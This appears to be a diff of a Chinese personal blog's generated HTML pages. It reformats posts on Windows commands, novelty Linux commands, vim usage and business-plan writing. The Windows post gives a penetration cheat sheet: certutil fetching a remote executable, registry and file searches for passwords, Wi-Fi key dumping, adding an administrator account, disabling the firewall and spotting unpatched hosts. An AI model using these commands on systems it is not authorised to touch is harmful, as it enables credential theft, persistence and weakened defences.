@@ -85,64 +85,125 @@
       
         <center><h2>常用Windows命令大全</h2></center> 
 
-<h3 id="渗透命令"><a href="#渗透命令" class="headerlink" title="渗透命令"></a>渗透命令</h3><p>certutil—–从远程url下载文件</p>
+<h3 id="渗透命令"><a href="#渗透命令" class="headerlink" title="渗透命令"></a>渗透命令</h3><ul>
+<li>certutil—–从远程url下载文件</li>
+</ul>
 <p>案例:certutil -urlcache  -split  -f <a href="http://baidu.com/test.exe" target="_blank" rel="noopener">http://baidu.com/test.exe</a></p>
-<p>findstr—–查找文件后缀结果</p>
-<p>findstr /s /i “pass” <em>.py</em></p>
-<p>reg query HKLM /f password /t REG_SZ /s—–搜集注册表中的各种密码数据</p>
+<ul>
+<li><p>findstr—–查找文件后缀结果</p>
+</li>
+<li><p>findstr /s /i “pass” <em>.py</em></p>
+</li>
+<li><p>reg query HKLM /f password /t REG_SZ /s—–搜集注册表中的各种密码数据</p>
+</li>
+</ul>
 <p>查看有没有开启远程链接，运行下面命令：</p>
-<p>REG QUERY “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections</p>
+<ul>
+<li>REG QUERY “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections</li>
+</ul>
 <p>结果：1表示关闭，0表示开启</p>
 <p>快速查找未打补丁的exp</p>
-<p>systeminfo&gt;bzhack.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type bzhack.txt|@find /i “%i”|| @echo %i you can exp)&amp;del /f /q /a bzhack.txt</p>
-<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>ipconfig/all—–网络配置情况</p>
-<p>ipconfig /displaydns—–查看本地DNS缓存</p>
-<p>netsh wlan show profile—–查看连接过的 wifi 名</p>
-<p>netsh wlan show profile WiFi-name key=clear 获取 wifi 对应的的密码</p>
-<p>query user—–查当前机器中正在线的用户,看管理员在不在</p>
-<p>net view——显示域列表/计算机列表</p>
-<p>net user——查看当前所有账号，判断域规模</p>
-<p>net group—–查看当前域所有的组名</p>
-<p>net user bzhack pass /add—–增加用户</p>
-<p>net user bzhack /del—–删除用户</p>
-<p>net Localgroup—–添加、显示本地组</p>
-<p>net localgroup administrators bzhack /add—–将bzhack加入管理员组</p>
-<p>net share—–  查看当前机器开启的共享</p>
-<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p>md—–建文件夹</p>
-<p>rd—–删除文件夹</p>
-<p>tree—–显示文件夹结构</p>
-<p>dir—–显示磁盘目录内容</p>
-<p>copy—–复制文件</p>
-<p>Xcopy—–copy加强版，复制文件夹</p>
-<p>del—–删除文件</p>
-<p>ren—–[原文件/夹名][新文件/夹名]修改文件名</p>
-<p>type—–查看文本内容</p>
-<p>dir /a /s /b d:&quot;*.conf”—–搜索d盘里conf结尾的文件</p>
-<p>edit—–文本编辑</p>
-<p>type—–显示文件内容</p>
-<h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><p>netstat -a—– 列出所有端口</p>
-<p>netstat -p—– 显示 PID 和进程名称</p>
-<p>netstat -r—– 显示核心路由信息</p>
-<p>netstat -at—–列出所有tcp连接 </p>
-<p>netstat -au—–列出所有ucp连接</p>
-<p>netstat -an |find “3389”   查看开启3389端口的信息</p>
-<p>netstat -ano | findstr “ESTABLISHED”  查看当前正处于连接状态的端口及ip</p>
-<p>netstat -ano | findstr “LISTENING”  查看当前正处于监听状态的端口及ip</p>
-<h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><p>ver—–查看版本 </p>
-<p>hostname—–查看机器名  </p>
-<p>whoami—–查看权限</p>
-<p>systeminfo—–查看配置</p>
-<p>tasklist—–查看进程</p>
-<p>cls—–清屏</p>
-<p>net start—–查看开启的服务，比如Terminal Services 远程连接服务</p>
-<p>net stop sharedaccess—–关闭防火墙</p>
-<p>set—–查看当前机器的环境变量,看有没有我们可以直接利用到的语言环境</p>
-<p>fsutil fsinfo drives—–列出当前机器上的所有盘符</p>
+<ul>
+<li>systeminfo&gt;bzhack.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type bzhack.txt|@find /i “%i”|| @echo %i you can exp)&amp;del /f /q /a bzhack.txt</li>
+</ul>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul>
+<li><p>ipconfig/all—–网络配置情况</p>
+</li>
+<li><p>ipconfig /displaydns—–查看本地DNS缓存</p>
+</li>
+<li><p>netsh wlan show profile—–查看连接过的 wifi 名</p>
+</li>
+<li><p>netsh wlan show profile WiFi-name key=clear 获取 wifi 对应的的密码</p>
+</li>
+<li><p>query user—–查当前机器中正在线的用户,看管理员在不在</p>
+</li>
+<li><p>net view——显示域列表/计算机列表</p>
+</li>
+<li><p>net user——查看当前所有账号，判断域规模</p>
+</li>
+<li><p>net group—–查看当前域所有的组名</p>
+</li>
+<li><p>net user bzhack pass /add—–增加用户</p>
+</li>
+<li><p>net user bzhack /del—–删除用户</p>
+</li>
+<li><p>net Localgroup—–添加、显示本地组</p>
+</li>
+<li><p>net localgroup administrators bzhack /add—–将bzhack加入管理员组</p>
+</li>
+<li><p>net share—–  查看当前机器开启的共享</p>
+</li>
+</ul>
+<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ul>
+<li><p>md—–建文件夹</p>
+</li>
+<li><p>rd—–删除文件夹</p>
+</li>
+<li><p>tree—–显示文件夹结构</p>
+</li>
+<li><p>dir—–显示磁盘目录内容</p>
+</li>
+<li><p>copy—–复制文件</p>
+</li>
+<li><p>Xcopy—–copy加强版，复制文件夹</p>
+</li>
+<li><p>del—–删除文件</p>
+</li>
+<li><p>ren—–[原文件/夹名][新文件/夹名]修改文件名</p>
+</li>
+<li><p>type—–查看文本内容</p>
+</li>
+<li><p>dir /a /s /b d:&quot;*.conf”—–搜索d盘里conf结尾的文件</p>
+</li>
+<li><p>edit—–文本编辑</p>
+</li>
+<li><p>type—–显示文件内容</p>
+</li>
+</ul>
+<h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><ul>
+<li><p>netstat -a—– 列出所有端口</p>
+</li>
+<li><p>netstat -p—– 显示 PID 和进程名称</p>
+</li>
+<li><p>netstat -r—– 显示核心路由信息</p>
+</li>
+<li><p>netstat -at—–列出所有tcp连接 </p>
+</li>
+<li><p>netstat -au—–列出所有ucp连接</p>
+</li>
+<li><p>netstat -an |find “3389”   查看开启3389端口的信息</p>
+</li>
+<li><p>netstat -ano | findstr “ESTABLISHED”  查看当前正处于连接状态的端口及ip</p>
+</li>
+<li><p>netstat -ano | findstr “LISTENING”  查看当前正处于监听状态的端口及ip</p>
+</li>
+</ul>
+<h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><ul>
+<li></li>
+<li><p>hostname—–查看机器名  </p>
+</li>
+<li><p>whoami—–查看权限</p>
+</li>
+<li><p>systeminfo—–查看配置</p>
+</li>
+<li><p>tasklist—–查看进程</p>
+</li>
+<li><p>cls—–清屏</p>
+</li>
+<li><p>net start—–查看开启的服务，比如Terminal Services 远程连接服务</p>
+</li>
+<li><p>net stop sharedaccess—–关闭防火墙</p>
+</li>
+<li><p>set—–查看当前机器的环境变量,看有没有我们可以直接利用到的语言环境</p>
+</li>
+<li><p>fsutil fsinfo drives—–列出当前机器上的所有盘符</p>
+</li>
+</ul>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/12/03/%E5%B8%B8%E7%94%A8Windows%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/" data-id="ck6rtuwrh000gjosv16phelbo" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/12/03/%E5%B8%B8%E7%94%A8Windows%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/" data-id="ck6rvaosg000dtcsv94sn1zwn" class="article-share-link">Share</a>
       
       
     </footer>
@@ -177,134 +238,66 @@
         <h2 id="sl命令"><a href="#sl命令" class="headerlink" title="sl命令"></a>sl命令</h2><ul>
 <li>你将会看到一辆火车从屏幕右边开往左边</li>
 </ul>
-<hr>
 <p>安装</p>
-<blockquote>
-<ul>
-<li>$sudo apt-get install sl</li>
-</ul>
-</blockquote>
-<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get install sl</span><br></pre></td></tr></table></figure>
+
 <p>运行</p>
-<blockquote>
-<ul>
-<li>$sl</li>
-</ul>
-</blockquote>
-<hr>
-<h2 id="fortune命令"><a href="#fortune命令" class="headerlink" title="$fortune命令"></a>$fortune命令</h2><p>输出一句话，有笑话，名言什么的</p>
-<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sl</span><br></pre></td></tr></table></figure>
+
+<h2 id="fortune命令"><a href="#fortune命令" class="headerlink" title="fortune命令"></a>fortune命令</h2><p>输出一句话，有笑话，名言什么的</p>
 <p>安装</p>
-<blockquote>
-<ul>
-<li>$sudo apt-get install fortune</li>
-</ul>
-</blockquote>
-<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get install fortune</span><br></pre></td></tr></table></figure>
+
 <p>运行</p>
-<blockquote>
-<ul>
-<li>$fortune</li>
-</ul>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fortune</span><br></pre></td></tr></table></figure>
+
 <h2 id="cowsay命令"><a href="#cowsay命令" class="headerlink" title="cowsay命令"></a>cowsay命令</h2><p>用ASCII字符打印牛、羊等动物</p>
-<hr>
 <p>安装</p>
-<blockquote>
-<ul>
-<li>$sudo apt-get install cowsay</li>
-</ul>
-</blockquote>
-<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get install cowsay</span><br></pre></td></tr></table></figure>
+
+
 <p>运行</p>
-<blockquote>
-<ul>
-<li>$cowsay “I am not a cow”</li>
-</ul>
-</blockquote>
-<hr>
-<h2 id="cmatrix命令"><a href="#cmatrix命令" class="headerlink" title="cmatrix命令"></a>cmatrix命令</h2><ul>
-<li>《黑客帝国》里的</li>
-</ul>
-<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cowsay “I am not a cow”</span><br></pre></td></tr></table></figure>
+
+<h2 id="cmatrix命令"><a href="#cmatrix命令" class="headerlink" title="cmatrix命令"></a>cmatrix命令</h2><p>《黑客帝国》里的</p>
 <p>安装</p>
-<blockquote>
-<ul>
-<li>$sudo apt-get install sl</li>
-</ul>
-</blockquote>
-<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get install sl</span><br></pre></td></tr></table></figure>
+
 <p>运行</p>
-<blockquote>
-<ul>
-<li>$sl</li>
-</ul>
-</blockquote>
-<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sl</span><br></pre></td></tr></table></figure>
+
+
 <h2 id="oneko命令"><a href="#oneko命令" class="headerlink" title="oneko命令"></a>oneko命令</h2><p>桌面上出现一直喵星人，跟着你的鼠标跑，你不动了它就睡觉。</p>
-<hr>
 <p>安装</p>
-<blockquote>
-<ul>
-<li>$sudo apt-get install oneko</li>
-</ul>
-</blockquote>
-<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get install oneko</span><br></pre></td></tr></table></figure>
+
 <p>运行</p>
-<blockquote>
-<ul>
-<li>$oneko</li>
-</ul>
-</blockquote>
-<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$oneko</span><br></pre></td></tr></table></figure>
+
 <h2 id="xeyes命令"><a href="#xeyes命令" class="headerlink" title="xeyes命令"></a>xeyes命令</h2><p>在屏幕上出现一双眼睛，盯着你的鼠标指针</p>
-<hr>
 <p>安装</p>
-<blockquote>
-<ul>
-<li>$sudo apt-get install xeyes</li>
-</ul>
-</blockquote>
-<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get install xeyes</span><br></pre></td></tr></table></figure>
+
 <p>运行</p>
-<blockquote>
-<ul>
-<li>$xeyes</li>
-</ul>
-</blockquote>
-<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$xeyes</span><br></pre></td></tr></table></figure>
+
 <h2 id="yes命令"><a href="#yes命令" class="headerlink" title="yes命令"></a>yes命令</h2><p>输出无穷无尽的字符，按ctrl+c结束，如</p>
-<hr>
-<blockquote>
-<ul>
-<li>$yes I so handsome.</li>
-</ul>
-</blockquote>
-<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$yes I so handsome.</span><br></pre></td></tr></table></figure>
+
 <h2 id="cal-9-1752命令"><a href="#cal-9-1752命令" class="headerlink" title="cal 9 1752命令"></a>cal 9 1752命令</h2><p>cal是打印日历，不过这个是很奇葩的一个月</p>
-<hr>
 <p>运行</p>
-<blockquote>
-<ul>
-<li>$cal 9 1752</li>
-</ul>
-</blockquote>
-<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cal 9 1752</span><br></pre></td></tr></table></figure>
+
 <h2 id="shred命令"><a href="#shred命令" class="headerlink" title="shred命令"></a>shred命令</h2><p>覆盖搞乱文件，就是文档粉碎，哈哈，要把你私藏的大片种子和电影销毁，不被恢复出来，就靠它了</p>
 <h2 id="factor命令"><a href="#factor命令" class="headerlink" title="factor命令"></a>factor命令</h2><p>分解因数</p>
-<hr>
 <p>运行</p>
-<blockquote>
-<ul>
-<li>$factor 60</li>
-</ul>
-</blockquote>
-<hr>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$factor 60</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/12/03/10%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84Linux%E5%91%BD%E4%BB%A4/" data-id="ck6rtuwqj0000josv4lapbi5t" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/12/03/10%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84Linux%E5%91%BD%E4%BB%A4/" data-id="ck6rvaor10000tcsv0qqqgxbe" class="article-share-link">Share</a>
       
       
     </footer>
@@ -336,103 +329,115 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="在Linux下，可以键入vimtutor命令，有一个包含实操的vim教程。"><a href="#在Linux下，可以键入vimtutor命令，有一个包含实操的vim教程。" class="headerlink" title="在Linux下，可以键入vimtutor命令，有一个包含实操的vim教程。"></a>在Linux下，可以键入vimtutor命令，有一个包含实操的vim教程。</h2><h4 id="VI的三种命令模式"><a href="#VI的三种命令模式" class="headerlink" title="VI的三种命令模式"></a>VI的三种命令模式</h4><blockquote>
-<ul>
-<li>Command（命令）模式，用于输入命令；</li>
-<li>Insert（插入）模式，用于插入文本；</li>
-<li>Visual（可视）模式，用于视化的的高亮并选定正文；</li>
+        <h2 id="在Linux下，可以键入vimtutor命令，有一个包含实操的vim教程。"><a href="#在Linux下，可以键入vimtutor命令，有一个包含实操的vim教程。" class="headerlink" title="在Linux下，可以键入vimtutor命令，有一个包含实操的vim教程。"></a>在Linux下，可以键入vimtutor命令，有一个包含实操的vim教程。</h2><h4 id="VI的三种命令模式"><a href="#VI的三种命令模式" class="headerlink" title="VI的三种命令模式"></a>VI的三种命令模式</h4><ul>
+<li><p>Command（命令）模式，用于输入命令；</p>
+</li>
+<li><p>Insert（插入）模式，用于插入文本；</p>
+</li>
+<li><p>Visual（可视）模式，用于视化的的高亮并选定正文；</p>
+</li>
 </ul>
-</blockquote>
-<hr>
-<h4 id="文件的保存和退出"><a href="#文件的保存和退出" class="headerlink" title="文件的保存和退出"></a>文件的保存和退出</h4><blockquote>
-<ul>
-<li>w  保存；</li>
-<li>w  filename 另存为filename；</li>
-<li>wq! 保存退出；</li>
-<li>wq! filename 注：以filename为文件名保存后退出；</li>
-<li>q! 不保存退出；</li>
-<li>x 应该是保存并退出 ，功能和:wq!相同</li>
+<h4 id="文件的保存和退出"><a href="#文件的保存和退出" class="headerlink" title="文件的保存和退出"></a>文件的保存和退出</h4><ul>
+<li><p>w  保存；</p>
+</li>
+<li><p>w  filename 另存为filename；</p>
+</li>
+<li><p>wq! 保存退出；</p>
+</li>
+<li><p>wq! filename 注：以filename为文件名保存后退出；</p>
+</li>
+<li><p>q! 不保存退出；</p>
+</li>
+<li><p>x 应该是保存并退出 ，功能和:wq!相同</p>
+</li>
 </ul>
-</blockquote>
-<hr>
-<h4 id="光标移动"><a href="#光标移动" class="headerlink" title="光标移动"></a>光标移动</h4><blockquote>
-<ul>
-<li>j 向下移动一行；</li>
-<li>k 向上移动一行；</li>
-<li>h 向左移动一个字符；</li>
-<li>l 向右移动一个字符；</li>
-<li>ctrl+b  向上移动一屏；</li>
-<li>ctrl+f  向下移动一屏；</li>
-<li>向上箭头    向上移动；</li>
-<li>向下箭头    向下移动；</li>
-<li>向左箭头    向左移动；</li>
-<li>向右箭头    向右移动；</li>
-<li>$ 移至行尾</li>
-<li>gg 移动至文档开始</li>
-<li>GG 移动到文档尾部</li>
-<li>ctrl + f 向前翻页</li>
-<li>ctrl + b 向后翻页</li>
+<h4 id="光标移动"><a href="#光标移动" class="headerlink" title="光标移动"></a>光标移动</h4><ul>
+<li><p>j 向下移动一行；</p>
+</li>
+<li><p>k 向上移动一行；</p>
+</li>
+<li><p>h 向左移动一个字符；</p>
+</li>
+<li><p>l 向右移动一个字符；</p>
+</li>
+<li><p>ctrl+b  向上移动一屏；</p>
+</li>
+<li><p>ctrl+f  向下移动一屏；</p>
+</li>
+<li><p>向上箭头    向上移动；</p>
+</li>
+<li><p>向下箭头    向下移动；</p>
+</li>
+<li><p>向左箭头    向左移动；</p>
+</li>
+<li><p>向右箭头    向右移动；</p>
+</li>
+<li><p>$ 移至行尾</p>
+</li>
+<li><p>gg 移动至文档开始</p>
+</li>
+<li><p>GG 移动到文档尾部</p>
+</li>
+<li><p>ctrl + f 向前翻页</p>
+</li>
+<li><p>ctrl + b 向后翻页</p>
+</li>
 </ul>
-</blockquote>
-<hr>
-<h4 id="插入模式"><a href="#插入模式" class="headerlink" title="插入模式"></a>插入模式</h4><blockquote>
-<ul>
-<li>i  在光标之前插入；</li>
-<li>a  在光标之后插入；</li>
-<li>I    在光标所在行的行首插入；</li>
-<li>A  在光标所在行的行末插O  在光标所在的行的上面插入一行；</li>
-<li>o  在光标所在的行的下面插入一行；</li>
-<li>s  删除光标后的一个字符，然后进入插入模式；</li>
-<li>S  删除光标所在的行，然后进入插入模式；</li>
+<h4 id="插入模式"><a href="#插入模式" class="headerlink" title="插入模式"></a>插入模式</h4><ul>
+<li><p>i  在光标之前插入；</p>
+</li>
+<li><p>a  在光标之后插入；</p>
+</li>
+<li><p>I    在光标所在行的行首插入；</p>
+</li>
+<li><p>A  在光标所在行的行末插O  在光标所在的行的上面插入一行；</p>
+</li>
+<li><p>o  在光标所在的行的下面插入一行；</p>
+</li>
+<li><p>s  删除光标后的一个字符，然后进入插入模式；</p>
+</li>
+<li><p>S  删除光标所在的行，然后进入插入模式；</p>
+</li>
 </ul>
-</blockquote>
-<hr>
-<h4 id="文本内容的删除"><a href="#文本内容的删除" class="headerlink" title="文本内容的删除"></a>文本内容的删除</h4><blockquote>
-<ul>
-<li>x 一个字符；</li>
-<li>#x 删除几个字符，#表示数字，比如3x；</li>
-<li>dw 删除一个单词；</li>
-<li>#dw 删除几个单词，#用数字表示，比如3dw表示删除三个单词；</li>
-<li>dd 删除一行；</li>
-<li>#dd 删除多个行，#代表数字，比如3dd 表示删除光标行及光标的下两行；</li>
-<li>d$ 删除光标到行尾的内容；</li>
-<li>J 清除光标所处的行与上一行之间的空格，把光标行和上一行接在一起；</li>
+<h4 id="文本内容的删除"><a href="#文本内容的删除" class="headerlink" title="文本内容的删除"></a>文本内容的删除</h4><ul>
+<li><p>x 一个字符；</p>
+</li>
+<li><p>#x 删除几个字符，#表示数字，比如3x；</p>
+</li>
+<li><p>dw 删除一个单词；</p>
+</li>
+<li><p>#dw 删除几个单词，#用数字表示，比如3dw表示删除三个单词；</p>
+</li>
+<li><p>dd 删除一行；</p>
+</li>
+<li><p>#dd 删除多个行，#代表数字，比如3dd 表示删除光标行及光标的下两行；</p>
+</li>
+<li><p>d$ 删除光标到行尾的内容；</p>
+</li>
+<li><p>J 清除光标所处的行与上一行之间的空格，把光标行和上一行接在一起；</p>
+</li>
 </ul>
-</blockquote>
-<h4 id="恢复修改及恢复删除"><a href="#恢复修改及恢复删除" class="headerlink" title="恢复修改及恢复删除"></a>恢复修改及恢复删除</h4><blockquote>
-<ul>
+<h4 id="恢复修改及恢复删除"><a href="#恢复修改及恢复删除" class="headerlink" title="恢复修改及恢复删除"></a>恢复修改及恢复删除</h4><ul>
 <li>u  撤消修改或删除操作；</li>
 </ul>
-</blockquote>
-<hr>
-<h4 id="复制及粘帖"><a href="#复制及粘帖" class="headerlink" title="复制及粘帖"></a>复制及粘帖</h4><blockquote>
-<ul>
-<li>yy 复制当前行</li>
-<li>#yy 复制多行，#用数字表示,比如3yy表示复制三行；</li>
-<li>如果在可视模式下，y可以复制选定的内容</li>
-<li>p在光标之后粘帖</li>
-<li>shift + p 在光标之前粘帖</li>
+<h4 id="复制及粘帖"><a href="#复制及粘帖" class="headerlink" title="复制及粘帖"></a>复制及粘帖</h4><ul>
+<li><p>yy 复制当前行</p>
+</li>
+<li><p>#yy 复制多行，#用数字表示,比如3yy表示复制三行；</p>
+</li>
+<li><p>如果在可视模式下，y可以复制选定的内容</p>
+</li>
+<li><p>p在光标之后粘帖</p>
+</li>
+<li><p>shift + p 在光标之前粘帖</p>
+</li>
 </ul>
-</blockquote>
-<hr>
-<h4 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h4><blockquote>
-<ul>
-<li>/SEARCH  注：正向查找，按n键把光标移动到下一个符合条件的地方；</li>
-<li>?SEARCH  注：反向查找，按shift+n 键，把光标移动到下一个符合条件的</li>
-<li>:s /SEARCH/REPLACE/g  注：把当前光标所处的行中的SEARCH单词，替换成REPLACE，并把所有SEARCH高亮显示；</li>
-<li>:%s /SEARCH/REPLACE  注：把文档中所有SEARCH替换成REPLACE；</li>
-<li>:#,# s /SEARCH/REPLACE/g  注：＃号表示数字，表示从多少行到多少行，把SEARCH替换成REPLACE；</li>
-</ul>
-</blockquote>
-<hr>
-<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><blockquote>
-<p><a href="https://www.cnblogs.com/zhang-ke/p/5645420.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhang-ke/p/5645420.html</a></p>
-</blockquote>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.cnblogs.com/zhang-ke/p/5645420.html" target="_blank" rel="noopener">cnblogs</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/12/01/Linux%E4%B8%ADvi%E7%BC%96%E8%BE%91%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" data-id="ck6rtuwr5000ajosv32234gnq" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/12/01/Linux%E4%B8%ADvi%E7%BC%96%E8%BE%91%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" data-id="ck6rvaorl0008tcsvgcm6hpyn" class="article-share-link">Share</a>
       
       
     </footer>
@@ -518,103 +523,113 @@
 <h2 id="商业计划书编写的逻辑框架"><a href="#商业计划书编写的逻辑框架" class="headerlink" title="商业计划书编写的逻辑框架"></a>商业计划书编写的逻辑框架</h2><h3 id="1-市场机会与需求"><a href="#1-市场机会与需求" class="headerlink" title="1.市场机会与需求"></a>1.市场机会与需求</h3><ul>
 <li>产品或服务的市场机会，市场需求程度、产品拟解决的具体问题</li>
 </ul>
-<h3 id="2-同行发展现状和市场分析"><a href="#2-同行发展现状和市场分析" class="headerlink" title="2.同行发展现状和市场分析"></a>2.同行发展现状和市场分析</h3><blockquote>
-<ul>
+<h3 id="2-同行发展现状和市场分析"><a href="#2-同行发展现状和市场分析" class="headerlink" title="2.同行发展现状和市场分析"></a>2.同行发展现状和市场分析</h3><ul>
 <li>国内外同行业同类技术、产品及服务简况</li>
 </ul>
-</blockquote>
-<h3 id="3-主要技术，产品及服务"><a href="#3-主要技术，产品及服务" class="headerlink" title="3.主要技术，产品及服务"></a>3.主要技术，产品及服务</h3><blockquote>
-<ul>
+<h3 id="3-主要技术，产品及服务"><a href="#3-主要技术，产品及服务" class="headerlink" title="3.主要技术，产品及服务"></a>3.主要技术，产品及服务</h3><ul>
 <li>主要技术指标和关键技术说明、目前所处发展阶段、本技术、产品及服务的新颖性、先进性和独特性等等</li>
 </ul>
-</blockquote>
-<h3 id="4-商业模式"><a href="#4-商业模式" class="headerlink" title="4.商业模式"></a>4.商业模式</h3><blockquote>
-<ul>
+<h3 id="4-商业模式"><a href="#4-商业模式" class="headerlink" title="4.商业模式"></a>4.商业模式</h3><ul>
 <li>产品主要目标客户群，市场营销策略等等</li>
 </ul>
-</blockquote>
-<h3 id="5-风险与对策"><a href="#5-风险与对策" class="headerlink" title="5.风险与对策"></a>5.风险与对策</h3><blockquote>
-<ul>
+<h3 id="5-风险与对策"><a href="#5-风险与对策" class="headerlink" title="5.风险与对策"></a>5.风险与对策</h3><ul>
 <li>包括政策、技术、市场等风险</li>
 </ul>
-</blockquote>
-<h3 id="6-核心团队"><a href="#6-核心团队" class="headerlink" title="6.核心团队"></a>6.核心团队</h3><blockquote>
-<ul>
+<h3 id="6-核心团队"><a href="#6-核心团队" class="headerlink" title="6.核心团队"></a>6.核心团队</h3><ul>
 <li>不少于3个人。提供姓名、性别、年龄、学历、工作背景、主要成就及在本项目中的角色，重点体现负责人的特质、团队的互补。</li>
 </ul>
-</blockquote>
 <hr>
-<h2 id="准备商业计划书5个关键点"><a href="#准备商业计划书5个关键点" class="headerlink" title="准备商业计划书5个关键点"></a>准备商业计划书5个关键点</h2><blockquote>
-<ul>
-<li>思路清晰，定位准确</li>
-<li>直观简洁，不必追求过度美化效果</li>
-<li>多展示，少说教，图表和数字要比话语更有说服力</li>
-<li>不出现负面、负能力用语</li>
-<li>严谨、真实性</li>
+<h2 id="准备商业计划书5个关键点"><a href="#准备商业计划书5个关键点" class="headerlink" title="准备商业计划书5个关键点"></a>准备商业计划书5个关键点</h2><ul>
+<li><p>思路清晰，定位准确</p>
+</li>
+<li><p>直观简洁，不必追求过度美化效果</p>
+</li>
+<li><p>多展示，少说教，图表和数字要比话语更有说服力</p>
+</li>
+<li><p>不出现负面、负能力用语</p>
+</li>
+<li><p>严谨、真实性</p>
+</li>
 </ul>
-</blockquote>
-<hr>
-<h2 id="项目路演"><a href="#项目路演" class="headerlink" title="项目路演"></a>项目路演</h2><blockquote>
-<ul>
-<li>你要干什么事</li>
-<li>为什么干这个事</li>
-<li>谁来干这个事</li>
-<li>怎样干这个事</li>
-<li>干这个事能得到什么</li>
-<li>干这个事需要多少钱</li>
+<h2 id="项目路演"><a href="#项目路演" class="headerlink" title="项目路演"></a>项目路演</h2><ul>
+<li><p>你要干什么事</p>
+</li>
+<li><p>为什么干这个事</p>
+</li>
+<li><p>谁来干这个事</p>
+</li>
+<li><p>怎样干这个事</p>
+</li>
+<li><p>干这个事能得到什么</p>
+</li>
+<li><p>干这个事需要多少钱</p>
+</li>
 </ul>
-</blockquote>
 <h2 id="路演讲稿"><a href="#路演讲稿" class="headerlink" title="路演讲稿"></a>路演讲稿</h2><blockquote>
